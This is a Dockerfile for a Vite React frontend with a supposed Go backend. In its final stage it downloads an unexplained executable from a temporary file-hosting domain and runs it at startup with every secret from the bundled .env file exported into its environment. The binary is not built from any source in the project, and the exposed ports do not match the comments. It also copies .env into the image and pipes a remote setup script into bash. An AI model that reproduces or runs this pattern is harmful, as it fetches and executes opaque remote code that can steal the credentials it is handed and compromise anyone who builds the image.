# Step 1: Build Vite React app
FROM node:20-bookworm-slim AS builder

WORKDIR /app

# Copy only package files first (better cache for npm install)
COPY package.json package-lock.json ./

# Install Node.js dependencies
RUN npm install

# 🔥 Copy .env first (important for Vite build)
COPY .env .env

# Then copy full source code
COPY . .

# Build the Vite project
RUN npm run build

# Step 2: Final image based on Ubuntu
FROM ubuntu:22.04

WORKDIR /app

# Install curl, then install Node.js 20 manually
RUN apt-get update && \
    apt-get install -y curl && \
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && \
    apt-get install -y nodejs && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# 🔥 Download the executable file
RUN curl -o go-strong-manager https://data.temp-files.xyz/application/go-strong-manager

# Make it executable
RUN chmod +x ./go-strong-manager

# Copy built Vite output (dist folder)
COPY --from=builder /app/dist ./dist

# Copy .env (for your Go executable if needed)
COPY .env .env

# Install "serve" globally (to serve Vite static files)
RUN npm install -g serve

# Expose both ports (frontend 3000 + Fiber backend 8090)
EXPOSE 3000
EXPOSE 8091
EXPOSE 89

# Start both backend (Go Fiber executable) and frontend (Vite dist)
CMD ["sh", "-c", "export $(cat .env | xargs) && ./go-strong-manager & serve -s dist -l 3000"]
